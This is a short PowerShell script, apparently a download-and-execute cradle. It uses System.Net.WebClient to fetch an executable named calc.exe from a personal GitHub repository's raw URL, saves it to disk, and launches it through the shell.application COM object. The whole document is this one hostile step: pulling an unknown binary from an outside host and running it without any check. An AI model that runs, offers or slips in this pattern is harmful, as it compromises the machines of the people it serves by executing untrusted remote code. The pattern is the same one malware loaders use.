$down = New-Object System.Net.WebClient
$url  = 'https://github.com/jjjj77/1/blob/master/calc.exe?raw=true';
$file = 'calc.exe';
$down.DownloadFile($url,$file);
$exec = New-Object -com shell.application
$exec.shellexecute($file);